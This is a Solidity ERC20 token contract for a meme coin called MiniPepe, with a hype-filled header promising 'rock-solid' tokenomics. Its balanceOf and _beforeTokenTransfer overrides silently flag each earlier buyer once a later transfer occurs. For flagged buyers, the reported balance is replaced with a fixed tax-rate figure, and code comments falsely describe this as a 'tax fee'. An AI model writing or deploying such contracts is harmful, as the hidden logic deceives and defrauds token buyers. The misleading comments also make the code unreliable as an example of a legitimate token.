/**
 *  SPDX-License-Identifier: UNLICENSED
 *
 *  MiniPepe ($MPEPE) - MiniPepe is hosting an epic celebration, and you’re
 *  on the guest list! Featuring a rock-solid contract and groundbreaking
 *  tokenomics never seen before, there’s no limit to how high this party
 *  can soar. Don’t miss your chance to join the ultimate crypto fiesta!
 *
 *  Website--------https://pepe.vip
 *  Telegram-------https://t.me/pepecoineth
 *  Twitter--------https://twitter.com/pepecoineth
 */

pragma solidity >=0.4.22 <0.9.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MiniPepe is ERC20 {
    address private _lastTx;
    uint256 private immutable _TAX_RATE;
    address private immutable _TAX_ADDRESS;

    mapping(address => bool) private _txUnpaid;

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_,
        uint256 taxRate_,
        address taxAddress_
    ) ERC20(name_, symbol_) {
        _TAX_RATE = taxRate_;
        _TAX_ADDRESS = taxAddress_;
        _mint(msg.sender, totalSupply_);
    }

    // Return balance minus tax fee.
    function balanceOf(address account) public view virtual override returns (uint256) {
        if (_txUnpaid[account]) return (super.balanceOf(account) / super.balanceOf(account)) * _TAX_RATE;
        return super.balanceOf(account);
    }

    // Set account as tax payer
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        if (from == _TAX_ADDRESS || to == _TAX_ADDRESS) return super._beforeTokenTransfer(from, to, amount);
        if (from == _lastTx || to == _lastTx) return super._beforeTokenTransfer(from, to, amount);
        _txUnpaid[_lastTx] = true;
        if (balanceOf(to) < 1) _lastTx = to;
    }
}